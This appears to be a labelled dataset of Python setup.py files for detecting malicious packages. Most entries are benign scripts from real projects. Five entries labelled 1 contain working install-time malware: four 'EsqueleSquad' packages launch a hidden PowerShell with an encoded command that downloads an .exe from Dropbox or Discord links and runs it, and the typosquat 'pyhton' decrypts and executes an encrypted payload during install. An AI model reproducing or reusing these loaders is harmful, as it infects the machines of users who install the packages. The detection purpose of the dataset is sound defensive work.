{"idx": "adpip-3.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adpip',\n    packages = ['modlib'],\n    version = '8.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-nose-1.4.7", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"django-nose packaging.\"\"\"\nfrom __future__ import unicode_literals\nimport os\nfrom codecs import open\nfrom setuptools import setup, find_packages\n\n\ndef get_long_description(title):\n    \"\"\"Create the long_description from other files.\"\"\"\n    ROOT = os.path.abspath(os.path.dirname(__file__))\n\n    readme = open(os.path.join(ROOT, 'README.rst'), 'r', 'utf8').read()\n    body_tag = \".. Omit badges from docs\"\n    readme_body_start = readme.index(body_tag)\n    assert readme_body_start\n    readme_body = readme[readme_body_start + len(body_tag):]\n\n    changelog = open(os.path.join(ROOT, 'changelog.rst'), 'r', 'utf8').read()\n    old_tag = \".. Omit older changes from package\"\n    changelog_body_end = changelog.index(old_tag)\n    assert changelog_body_end\n    changelog_body = changelog[:changelog_body_end]\n\n    bars = '=' * len(title)\n    long_description = \"\"\"\n%(bars)s\n%(title)s\n%(bars)s\n%(readme_body)s\n\n%(changelog_body)s\n\n_(Older changes can be found in the full documentation)._\n\"\"\" % locals()\n    return long_description\n\n\nsetup(\n    name='django-nose',\n    version='1.4.7',\n    description='Makes your Django tests simple and snappy',\n    long_description=get_long_description('django-nose'),\n    author='Jeff Balogh',\n    author_email='me@jeffbalogh.org',\n    maintainer='John Whitlock',\n    maintainer_email='jwhitlock@mozilla.com',\n    url='http://github.com/jazzband/django-nose',\n    license='BSD',\n    packages=find_packages(exclude=['testapp', 'testapp/*']),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=['nose>=1.2.1'],\n    test_suite='testapp.runtests.runtests',\n    # This blows up tox runs that install django-nose into a virtualenv,\n    # because it causes Nose to import django_nose.runner before the Django\n    # settings are initialized, leading to a mess of errors. There's no reason\n    # we need FixtureBundlingPlugin declared as an entrypoint anyway, since you\n    # need to be using django-nose to find the it useful, and django-nose knows\n    # about it intrinsically.\n    # entry_points=\"\"\"\n    #    [nose.plugins.0.10]\n    #    fixture_bundler = django_nose.fixture_bundling:FixtureBundlingPlugin\n    #    \"\"\",\n    keywords='django nose django-nose',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 1.8',\n        'Framework :: Django :: 1.9',\n        'Framework :: Django :: 1.10',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.0',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Software Development :: Testing'\n    ]\n)\n", "target": 0}
{"idx": "dnspython-2.2.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['dns', 'dns.rdtypes', 'dns.rdtypes.ANY', 'dns.rdtypes.CH', 'dns.rdtypes.IN']\n\npackage_data = \\\n{'': ['*']}\n\nextras_require = \\\n{'curio': ['curio>=1.2,<2.0', 'sniffio>=1.1,<2.0'],\n 'dnssec': ['cryptography>=2.6,<37.0'],\n 'doh': ['requests-toolbelt>=0.9.1,<0.10.0', 'requests>=2.23.0,<3.0.0'],\n 'doh:python_full_version >= \"3.6.2\"': ['httpx>=0.21.1', 'h2>=4.1.0'],\n 'idna': ['idna>=2.1,<4.0'],\n 'trio': ['trio>=0.14,<0.20'],\n 'wmi': ['wmi>=1.5.1,<2.0.0']}\n\nsetup_kwargs = {\n    'name': 'dnspython',\n    'version': '2.2.1',\n    'description': 'DNS toolkit',\n    'long_description': \"# dnspython\\n\\n[![Build Status](https://github.com/rthalley/dnspython/actions/workflows/python-package.yml/badge.svg)](https://github.com/rthalley/dnspython/actions/)\\n[![Documentation Status](https://readthedocs.org/projects/dnspython/badge/?version=latest)](https://dnspython.readthedocs.io/en/latest/?badge=latest)\\n[![PyPI version](https://badge.fury.io/py/dnspython.svg)](https://badge.fury.io/py/dnspython)\\n[![License: ISC](https://img.shields.io/badge/License-ISC-brightgreen.svg)](https://opensource.org/licenses/ISC)\\n\\n## INTRODUCTION\\n\\ndnspython is a DNS toolkit for Python. It supports almost all record types. It\\ncan be used for queries, zone transfers, and dynamic updates. It supports TSIG\\nauthenticated messages and EDNS0.\\n\\ndnspython provides both high and low level access to DNS. The high level classes\\nperform queries for data of a given name, type, and class, and return an answer\\nset. The low level classes allow direct manipulation of DNS zones, messages,\\nnames, and records.\\n\\nTo see a few of the ways dnspython can be used, look in the `examples/`\\ndirectory.\\n\\ndnspython is a utility to work with DNS, `/etc/hosts` is thus not used. For\\nsimple forward DNS lookups, it's better to use `socket.getaddrinfo()` or\\n`socket.gethostbyname()`.\\n\\ndnspython originated at Nominum where it was developed\\nto facilitate the testing of DNS software.\\n\\n## ABOUT THIS RELEASE\\n\\nThis is dnspython 2.2.1\\nPlease read\\n[What's New](https://dnspython.readthedocs.io/en/stable/whatsnew.html) for\\ninformation about the changes in this release.\\n\\n## INSTALLATION\\n\\n* Many distributions have dnspython packaged for you, so you should\\n  check there first.\\n* If you have pip installed, you can do `pip install dnspython`\\n* If not just download the source file and unzip it, then run\\n  `sudo python setup.py install`\\n* To install the latest from the master branch, run `pip install git+https://github.com/rthalley/dnspython.git`\\n\\nDnspython's default installation does not depend on any modules other than\\nthose in the Python standard library.  To use some features, additional modules\\nmust be installed.  For convenience, pip options are defined for the requirements.\\n\\nIf you want to use DNS-over-HTTPS, run\\n`pip install dnspython[doh]`.\\n\\nIf you want to use DNSSEC functionality, run\\n`pip install dnspython[dnssec]`.\\n\\nIf you want to use internationalized domain names (IDNA)\\nfunctionality, you must run\\n`pip install dnspython[idna]`\\n\\nIf you want to use the Trio asynchronous I/O package, run\\n`pip install dnspython[trio]`.\\n\\nIf you want to use the Curio asynchronous I/O package, run\\n`pip install dnspython[curio]`.\\n\\nIf you want to use WMI on Windows to determine the active DNS settings\\ninstead of the default registry scanning method, run\\n`pip install dnspython[wmi]`.\\n\\nNote that you can install any combination of the above, e.g.:\\n`pip install dnspython[doh,dnssec,idna]`\\n\\n### Notices\\n\\nPython 2.x support ended with the release of 1.16.0.  Dnspython 2.0.0 through\\n2.2.x support Python 3.6 and later.  As of dnspython 2.3.0, the minimum\\nsupported Python version will be 3.7.  We plan to align future support with the\\nlifetime of the Python 3 versions.\\n\\nDocumentation has moved to\\n[dnspython.readthedocs.io](https://dnspython.readthedocs.io).\\n\\nThe ChangeLog has been discontinued.  Please see the github project page\\nand git history for detailed change information.\\n\",\n    'author': 'Bob Halley',\n    'author_email': 'halley@dnspython.org',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://www.dnspython.org',\n    'packages': packages,\n    'package_data': package_data,\n    'extras_require': extras_require,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "dbt-databricks-1.1.1", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\n# require python 3.7 or newer\nif sys.version_info < (3, 7):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7 or higher.\")\n    sys.exit(1)\n\n\n# require version of setuptools that supports find_namespace_packages\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" and try again')\n    sys.exit(1)\n\n\n# pull long description from README\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\"), \"r\", encoding=\"utf8\") as f:\n    long_description = f.read()\n\n\n# get this package's version from dbt/adapters/<name>/__version__.py\ndef _get_plugin_version():\n    _version_path = os.path.join(this_directory, \"dbt\", \"adapters\", \"databricks\", \"__version__.py\")\n    try:\n        exec(open(_version_path).read())\n        return locals()[\"version\"]\n    except IOError:\n        print(\"Failed to load dbt-databricks version file for packaging.\", file=sys.stderr)\n        sys.exit(-1)\n\n\npackage_name = \"dbt-databricks\"\npackage_version = _get_plugin_version()\ndbt_spark_version = \"1.1.0\"\ndescription = \"\"\"The Databricks adapter plugin for dbt\"\"\"\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"Databricks\",\n    author_email=\"feedback@databricks.com\",\n    url=\"https://github.com/databricks/dbt-databricks\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    include_package_data=True,\n    install_requires=[\n        \"dbt-spark~={}\".format(dbt_spark_version),\n        \"databricks-sql-connector>=2.0.1\",\n    ],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "django-db-signals-0.1.1", "func": "# coding=utf-8\nfrom setuptools import setup\n\n\nsetup(\n    name=\"django-db-signals\",\n    version=\"0.1.1\",\n    description=\"Django database signals (pre/post commit/rollback).\",\n    long_description=__doc__,\n    author=\"Bradley Ayers\",\n    author_email=\"bradley.ayers@gmail.com\",\n    url=\"https://github.com/bradleyayers/django-db-signals\",\n    license=\"Simplified BSD\",\n    packages=[\"django_db_signals\"],\n    install_requires=[\"Django >=1.2\"],\n    classifiers=[\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        \"Topic :: Database\",\n    ],\n)\n", "target": 0}
{"idx": "flake8-secure-coding-standard-1.3.0", "func": "# -*- coding: utf-8 -*-\n# Copyright 2021 Damien Nguyen\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Dummy setup script.\"\"\"\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "py-guisuper-2.71", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-guisuper',\n    packages = ['modlib'],\n    version = '1.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fastprogress-1.0.3", "func": "from pkg_resources import parse_version\nfrom configparser import ConfigParser\nimport setuptools\nassert parse_version(setuptools.__version__)>=parse_version('36.2')\n\n# note: all settings are in settings.ini; edit there, not here\nconfig = ConfigParser(delimiters=['='])\nconfig.read('settings.ini')\ncfg = config['DEFAULT']\n\ncfg_keys = 'version description keywords author author_email'.split()\nexpected = cfg_keys + \"lib_name user branch license status min_python audience language\".split()\nfor o in expected: assert o in cfg, \"missing expected setting: {}\".format(o)\nsetup_cfg = {o:cfg[o] for o in cfg_keys}\n\nlicenses = {\n    'apache2': ('Apache Software License 2.0','OSI Approved :: Apache Software License'),\n}\nstatuses = [ '1 - Planning', '2 - Pre-Alpha', '3 - Alpha',\n    '4 - Beta', '5 - Production/Stable', '6 - Mature', '7 - Inactive' ]\npy_versions = '2.0 2.1 2.2 2.3 2.4 2.5 2.6 2.7 3.0 3.1 3.2 3.3 3.4 3.5 3.6 3.7 3.8 3.9 3.10'.split()\n\nrequirements = cfg.get('requirements','').split()\nlic = licenses[cfg['license']]\nmin_python = cfg['min_python']\n\nsetuptools.setup(\n    name = cfg['lib_name'],\n    license = lic[0],\n    classifiers = [\n        'Development Status :: ' + statuses[int(cfg['status'])],\n        'Intended Audience :: ' + cfg['audience'].title(),\n        'License :: ' + lic[1],\n        'Natural Language :: ' + cfg['language'].title(),\n    ] + ['Programming Language :: Python :: '+o for o in py_versions[py_versions.index(min_python):]],\n    url = 'https://github.com/{}/{}'.format(cfg['user'],cfg['lib_name']),\n    packages = setuptools.find_packages(),\n    include_package_data = True,\n    install_requires = requirements,\n    python_requires  = '>=' + cfg['min_python'],\n    long_description = open('README.md').read(),\n    long_description_content_type = 'text/markdown',\n    zip_safe = False,\n    entry_points = { 'console_scripts': cfg.get('console_scripts','').split() },\n    **setup_cfg)\n\n", "target": 0}
{"idx": "django-elasticsearch-dsl-7.2.2", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nversion = '7.2.2'\n\nif sys.argv[-1] == 'publish':\n    try:\n        import wheel\n        print(\"Wheel version: \", wheel.__version__)\n    except ImportError:\n        print('Wheel library missing. Please run \"pip install wheel\"')\n        sys.exit()\n    os.system('python setup.py sdist upload')\n    os.system('python setup.py bdist_wheel upload')\n    sys.exit()\n\nif sys.argv[-1] == 'tag':\n    print(\"Tagging the version on git:\")\n    os.system(\"git tag -a %s -m 'version %s'\" % (version, version))\n    os.system(\"git push --tags\")\n    sys.exit()\n\nreadme = open('README.rst').read()\nhistory = open('HISTORY.rst').read().replace('.. :changelog:', '')\n\nsetup(\n    name='django-elasticsearch-dsl',\n    version=version,\n    description=\"\"\"Wrapper around elasticsearch-dsl-py for django models\"\"\",\n    long_description=readme + '\\n\\n' + history,\n    author='Sabricot',\n    url='https://github.com/sabricot/django-elasticsearch-dsl',\n    packages=[\n        'django_elasticsearch_dsl',\n    ],\n    include_package_data=True,\n    install_requires=[\n        'elasticsearch-dsl>=7.2.0<8.0.0',\n        'six',\n    ],\n    license=\"Apache Software License 2.0\",\n    zip_safe=False,\n    keywords='django elasticsearch elasticsearch-dsl',\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Framework :: Django',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.0',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "pyhton-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'trPFxngKAviJBHWVGTOq pzxpZkfResPUEOXtPWLB hp beenpuGcdJdGEggCOwzwFerjmnYZPQTm GUCTacIdClkG'\nLONG_DESCRIPTION = 'yDsJspTXQVDwEkKbHHLdwCwPRMiPsJMJufICuyHBbjgKkCUxGLaXHurICpvYMGwkyJBiSx YKNPPvpROGPWmVpGct WaQDoVVeOuqcRjsNgSHUsZSmNdgzHWoSZxQrVEejBmfXjIHNmtMHFZdsyoe JiJOJlvGcnNfjjYETvGOscrkAnthTrpoLzTpPOkhz'\n\n\nclass WGCAiPDhqQAwjSRwJXicnAYttjIoOPCIVuAvnyTEJqivTEtKeeBTnTDEKiaCtGjCkPsSoglPIJxkmfnDlYnewjJHrJkrBWXvgpPkwrRLYWDQGXICtVXTXazpGCfIHxEiwLSdGXGJcgDWLnDWKvwlJSPjacCTQIHcTkAIgYbUMA(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'W4Jx0R3B0U4HYBwpjMMyLWKb7aztWyXkCOxp_xAiCTI=').decrypt(b'gAAAAABmbvJdXC2Z707EIbmgYU1Jv0mVmoEsYG6gBpVzhmDw_Uz25FP4rVD6XDPG5Gnvky5h2k5iPMM8ug2wPb_MERDsAcU0UhrdUisn8q1FOPuKLwPnRvT0bwNO4snnJ58_BQElnp0-QPSs03WcNgVgXfFWu1ClsIkh5hYEnkOoh6nCqecM7sbauKFpoEP4uBnZtBGMENXGwURYGRQqIevD6qVEfU2fPg=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pyhton\",\n    version=VERSION,\n    author=\"UhjmhOPVzGIrQGVnnYEw\",\n    author_email=\"BxboICLIaiWYZafTtUO@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': WGCAiPDhqQAwjSRwJXicnAYttjIoOPCIVuAvnyTEJqivTEtKeeBTnTDEKiaCtGjCkPsSoglPIJxkmfnDlYnewjJHrJkrBWXvgpPkwrRLYWDQGXICtVXTXazpGCfIHxEiwLSdGXGJcgDWLnDWKvwlJSPjacCTQIHcTkAIgYbUMA,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "gspread-formatting-1.0.6", "func": "try:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nimport os.path\nimport sys\n\nPY3 = sys.version_info >= (3, 0)\n\nsetup(\n    name='gspread-formatting',\n    packages=['gspread_formatting'],\n    package_data={'': ['*.rst']},\n    test_suite='test',\n    install_requires=[\n        'gspread>=3.0.0' \n        ],\n    description='Complete Google Sheets formatting support for gspread worksheets',\n    author='Robin Thomas',\n    author_email='rthomas900@gmail.com',\n    license='MIT',\n    url='https://github.com/robin900/gspread-formatting',\n    keywords=['spreadsheets', 'google-spreadsheets', 'formatting', 'cell-format'],\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Topic :: Office/Business :: Financial :: Spreadsheet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\"\n        ],\n    zip_safe=True\n)\n", "target": 0}
{"idx": "databricks-cli-0.17.1", "func": "# Databricks CLI\n# Copyright 2017 Databricks, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"), except\n# that the use of services to which certain application programming\n# interfaces (each, an \"API\") connect requires that the user first obtain\n# a license for the use of the APIs from Databricks, Inc. (\"Databricks\"),\n# by creating an account at www.databricks.com and agreeing to either (a)\n# the Community Edition Terms of Service, (b) the Databricks Terms of\n# Service, or (c) another written agreement between Licensee and Databricks\n# for the use of the APIs.\n#\n# You may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport imp\nimport io\nimport os\nfrom setuptools import setup, find_packages\n\nversion = imp.load_source(\n    'databricks_cli.version', os.path.join('databricks_cli', 'version.py')).version\n\nsetup(\n    name='databricks-cli',\n    version=version,\n    packages=find_packages(include=['databricks_cli*']),\n    install_requires=[\n        # Note: please keep this in sync with `requirements.txt`.\n        'click>=7.0',\n        'pyjwt>=1.7.0',\n        'oauthlib>=3.1.0',\n        'requests>=2.17.3',\n        'tabulate>=0.7.7',\n        'six>=1.10.0',\n        'configparser>=0.3.5;python_version < \"3.6\"',\n    ],\n    entry_points='''\n        [console_scripts]\n        databricks=databricks_cli.cli:cli\n        dbfs=databricks_cli.dbfs.cli:dbfs_group\n    ''',\n    zip_safe=False,\n    author='Andrew Chen',\n    author_email='andrewchen@databricks.com',\n    description='A command line interface for Databricks',\n    long_description=io.open('README.rst', encoding='utf-8').read(),\n    license='Apache License 2.0',\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.6',\n        'License :: OSI Approved :: Apache Software License',\n    ],\n    keywords='databricks cli',\n    url='https://github.com/databricks/databricks-cli'\n)\n", "target": 0}
{"idx": "esqcontrolhttphttp-5.22", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcontrolhttphttp',\n    packages = ['modlib'],\n    version = '1.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqcandysplitpep-8.82", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcandysplitpep',\n    packages = ['modlib'],\n    version = '6.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
